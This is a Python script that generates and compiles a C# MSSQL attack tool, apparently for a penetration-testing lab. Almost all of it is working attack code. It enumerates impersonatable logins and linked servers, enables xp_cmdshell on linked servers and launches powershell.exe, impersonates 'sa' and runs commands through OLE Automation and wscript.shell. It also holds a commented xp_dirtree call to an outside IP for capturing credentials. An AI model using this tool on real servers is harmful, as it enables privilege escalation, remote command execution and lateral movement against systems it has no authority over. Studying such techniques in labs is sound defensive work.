#!/bin/env python3
import ak

FN_BASE = "win_sqlclient"
FN_CS = FN_BASE + ".cs"
FN_EXE = FN_BASE + ".exe"

template = r"""
using System;
using System.Data.SqlClient;
using System.Collections.Generic;


namespace SQLClient
{
    public class Program
    {
        private static string sqlServer;
        private static string database;

	public static String executeQuery(String query, SqlConnection con) {
		SqlCommand cmd = new SqlCommand(query, con);
		SqlDataReader reader = cmd.ExecuteReader();
		try
		{
			String result = "";
			while (reader.Read() == true)
			{
				result += reader[0] + "\n";
			}
			reader.Close();
			return result;

		}
		catch
		{
			return "";
		}

        }

	public static List<string> executeQueryList(String query, SqlConnection con) {
		SqlCommand cmd = new SqlCommand(query, con);
		SqlDataReader reader = cmd.ExecuteReader();
                List<string> result = new List<string>();

		try
		{
			while (reader.Read() == true)
			{
				result.Add(reader[0].ToString());
			}
			reader.Close();
			return result;

		}
		catch
		{
			return result;
		}

        }

        public static String getLinkedServerVersion(SqlConnection con) {

        List<string> servers = executeQueryList("EXEC sp_linkedservers;", con);

        for (var i = 0; i < servers.Count; i++) {
          try {
            String query = $"select version from openquery(\"{servers[i]}\", 'select @@version as version')";
            String dbQuery = executeQuery(query, con);
            Console.WriteLine($"Linked server {servers[i]} version: {dbQuery}" );

            Console.WriteLine($"Attempting to enable advanced options on {servers[i]}" );
            query = $"select version from openquery(\"{servers[i]}\", 'sp_configure ''show advanced options'', 1;reconfigure')";
            dbQuery = executeQuery(query, con);
            Console.WriteLine($"{servers[i]} response: {dbQuery}" );

            query = $"select version from openquery(\"{servers[i]}\", 'sp_configure ''xp_cmdshell'',1;reconfigure')";
            dbQuery = executeQuery(query, con);
            Console.WriteLine($"{servers[i]} response: {dbQuery}" );

            query = $"select version from openquery(\"{servers[i]}\", 'xp_cmdshell ''powershell.exe'';')";
            dbQuery = executeQuery(query, con);
            Console.WriteLine($"{servers[i]} response: {dbQuery}" );

            query = $"EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT {servers[i]}";
            dbQuery = executeQuery(query, con);
            Console.WriteLine($"Enabled Advanced Options for server {servers[i]} response: {dbQuery}" );
          }
          catch(Exception e) {
            Console.WriteLine($"Linked server {servers[i]} error"+e );
          }

        }

        return "";
        }


        
        public static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Using defaults localhost and master as database");
                sqlServer = "localhost";
                database = "master";
            } else
            {
                sqlServer = args[0];
                database = args[1];
            }

            String conString = "Server = " + sqlServer + ";Database = " + database + "; Integrated Security = True;";

            SqlConnection con = new SqlConnection(conString);
            try
            {
                con.Open();
                Console.WriteLine("Auth success! Woot");
            }
            catch
            {
                Console.WriteLine("Auth failed :(");
                Environment.Exit(0);
            }

            // Get Impersonatable users
	    String impersonate = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';", con);
	    Console.WriteLine($"Logins that can be impersonated: {impersonate}" );

            // Get DB list
            String dbs = executeQuery("SELECT name FROM master.dbo.sysdatabases WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb');", con);
            Console.WriteLine($"Non-system DBs found:: {dbs}" );

            // Get Linked servers
	    String linked = executeQuery("EXEC sp_linkedservers;", con);
	    Console.WriteLine($"Linked Servers: {linked}" );

            getLinkedServerVersion(con);

	    String loggedin = executeQuery("SELECT USER_NAME();", con);
	    Console.WriteLine($"Logged in as: {loggedin}" );

            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
            SqlCommand command = new SqlCommand(querypublicrole, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            
            if (role == 1)
            {
                Console.WriteLine("User is a member of public role");
            }
            else
            {
                Console.WriteLine("User is NOT a member of public role");
            }
            reader.Close();

            String executeas = "use msdb; EXECUTE AS USER = 'dbo';";
            command = new SqlCommand(executeas, con);
            reader = command.ExecuteReader(); reader.Close();


            String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
            String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
            String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"echo Test > C:\\Tools\\file.txt\"';";
            command = new SqlCommand(impersonateUser, con);
            reader = command.ExecuteReader();
            reader.Close();
            command = new SqlCommand(enable_ole, con);
            reader = command.ExecuteReader();
            reader.Close();
            command = new SqlCommand(execCmd, con);
            reader = command.ExecuteReader();


            con.Close();

            //String query = "EXEC master..xp_dirtree \"\\\\192.168.49.65\\\\test\";";
            //command = new SqlCommand(query, con);
            //reader = command.ExecuteReader();
            
            //reader.Close();
            //con.Close();
        }}}
"""

ak.write_file(FN_CS, template)
ak.cs_compile(FN_CS, "/r:libraries/System.Data.SqlClient.dll /r:libraries/System.Data.dll")

# Command line options
# Run with OLE
# Attempt to priv esc
# Try XP_DIRTREE to LHOST
# Get list of remote hosts and execute
